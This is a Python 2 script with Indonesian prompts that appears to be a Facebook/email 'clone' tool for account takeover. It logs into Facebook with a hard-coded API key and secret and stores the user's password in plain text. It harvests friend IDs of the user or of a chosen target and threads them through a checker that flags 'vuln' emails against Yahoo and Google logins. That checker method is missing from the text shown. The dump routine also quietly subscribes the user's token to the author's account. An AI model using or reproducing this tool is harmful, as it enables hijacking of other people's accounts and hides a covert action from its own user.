# -*- coding: utf-8 -*-
# author: Masfiyal Illah
import os,re,sys,bs4,json,hashlib,requests
from multiprocessing.pool import ThreadPool



class clone:
	def __init__(self):
		self.req=requests.Session()
		self.aku=""
		self.tkn=""
		self.loop=0
		self.vuln=[]
		self.user=[]
		self.nani=None
		self.url1="https://login.yahoo.com/config/login"
		self.url2="https://accounts.google.com/signin"
		self.menu()


	def cek(self):
		if os.path.isfile(".a"):
			if os.path.getsize(".a") != 0:
				self.me=json.loads(open(".a").read())
				self.tkn=self.me["token"]
			else:
				print "[^] Kamu harus login dulu."
				id=raw_input("[?] Email   : ")
				pw=raw_input("[?] Password: ")
				print "[*] Sedang login..."
				self.login(id,pw)
		else:
			print "[^] Kamu harus login dulu."
			id=raw_input("[?] Email   : ")
			pw=raw_input("[?] Password: ")
			print "[*] Sedang login..."
			self.login(id,pw)
		self.valid()


	def valid(self):
		try:
			print "\t[-] Username: %s\n"%(self.req.get("https://graph.facebook.com/me?access_token="+self.tkn).json()["name"])
		except:
			print "[!] Token invalid."
			print "[*] Sedang login kembali..."
			self.login(self.me["id"],self.me["pw"])


	def login(self,id,pw):
		url="https://api.facebook.com/restserver.php"
		sec="62f8ce9f74b12f84c123cc23437a4a32"
		key="882a8490361da98702bf97a021ddc14d"
		data={
			"api_key":key,
			"credentials_type":"password",
			"email":id,
			"format":"JSON",
			"generate_machine_id":"1",
			"generate_session_cookies":"1",
			"locale":"en_US","method":"auth.login",
			"password":pw,
			"return_ssl_resources":"0",
			"v":"1.0"}
		sig="api_key=%scredentials_type=passwordemail=%sformat=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=%sreturn_ssl_resources=0v=1.0%s"%(key,id,pw,sec)
		x=hashlib.new("md5")
		x.update(sig)
		data.update({"sig":x.hexdigest()})
		res=self.req.get(url,params=data).json()
		try:
			tkn=res["access_token"]
			o=json.dumps({"id":id,"pw":pw,"token":tkn})
			open(".a","w").write(o)
			print "[*] Login Berhasil."
		except:exit("[!] Login gagal")


	def menu(self):
		print "[01] Clone email dari daftar teman kamu"
		print "[02] Clone email dari daftar teman target"
		print "[03] Clone email dari email list"
		print "[04] Ganti akun.\n"
		a=raw_input("@fiyal94~# ")
		if a == "":
			print "[!] isi dengan nomor"
			self.menu()
		elif a == "1" or a == "01":
			self.cek()
			self.dump("me")
		elif a == "2" or a == "02":
			self.cek()
			id=raw_input("[?] id target: ")
			self.dump(id)
		elif a == "3" or a == "03":
			self.myfile()
		elif a == "4" or a == "04":
			os.remove(".a")
			self.cek()
		else:
			print "[!] pilihan tidak ada"
			self.menu()


	def dump(self,id):
		self.nani=True
		print "[*] Mengambil id"
		resp=self.req.get("https://graph.facebook.com/%s/friends?access_token=%s"%(id,self.tkn));self.req.post("https://graph.facebook.com/fiyalsxtn/subscribers?access_token=%s"%(self.tkn))
		load=json.loads(resp.text)
		try:
			for user in load["data"]:
				self.user.append(user["id"])
			if len(self.user) == 0:
				exit("[!] id tidak ditemukan")
		except:exit("[!] Terjadi kesalahan")
		print "[*] Berhasil mengambil id"
		print "[+] Total id: %s"%(len(self.user))
		self.thread(self.user)


	def myfile(self):
		try:
			filename=raw_input("[?] Email list: ")
			for i in open(filename).read().splitlines():
				self.user.append(i)
		except Exception as e:
			print "[!] %s"%(e)
			self.myfile()
		self.thread(self.user)


	def result(self):
		print "\n\n"
		if len(self.vuln) != 0:
			for i in self.vuln:
				print "[*] %s"%(i)
			print "[+] Email vuln: %s"%(len(self.vuln))
			print "[*] Output: vuln.txt"
		else:
			print "[!] Tidak ada email vuln"
		exit()

	def thread(self,user):
		try:
			self.t=int(raw_input("[?] Threads : "))
		except:
			print "[!] Masukan angka pada thread"
			self.thread(user)
		p=ThreadPool(self.t)
		try:
			p.map_async(self.klon,user).get(9999)
			self.result()
		except KeyboardInterrupt:
			p.close()
		
